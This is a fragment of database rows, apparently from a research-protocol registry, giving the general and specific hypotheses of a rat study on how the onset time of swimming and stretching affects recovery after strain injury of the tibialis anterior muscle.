	(5514,120,'hypothesis','\"General Hypothesis\\nSwimming and stretching onset time will affect the healing and functional recovery after induced-strain muscle injury of TA muscle in Wister rats.\\n       Specific Hypotheses\\nThis study hypothesizes that:\\n1.\\tNormal and injured control groups will significantly differ with regards to:\\n   1.1.\\t Hind limb Function as measured by SFI.\\n   1.2.\\tTA muscle qualitative histopathological scoring.\\n   1.3.\\tTA muscle Histomorphometric analysis\\n2. Animals that will start swimming and stretching at the acute or subacute stages will have significantly recovery compared to injured control in terms of:\\n   2.1.\\tHind limb Function as measured by SFI.\\n   2.2.\\tTA muscle qualitative histopathological scoring.\\n   2.3.\\tTA muscle Histomorphometric analysis\\n3.\\tAnimals that will start swimming and stretching at the acute or subacute stages will not be significantly different from normal control in terms of :\\n   3.1.\\tHind limb Function as measured by SFI.\\n   3.2.\\tTA muscle qualitative histopathological scoring.\\n   3.3.\\tTA muscle Histomorphometric analysis\\n4.\\tAnimals that will start swimming and stretching at the acute or subacute stages will not be significantly different from each other in terms of:\\n   4.1.\\tHind limb Function as measured by SFI.\\n   4.2.\\tTA muscle qualitative histopathological scoring.\\n   4.3.\\tTA muscle Histomorphometric analysis\\n\"','2022-03-31 13:23:42','2022-03-31 13:23:42'),
	(5515,120,'intervention_type','\"compound\"','2022-03-31 13:23:42','2022-03-31 13:23:42'),
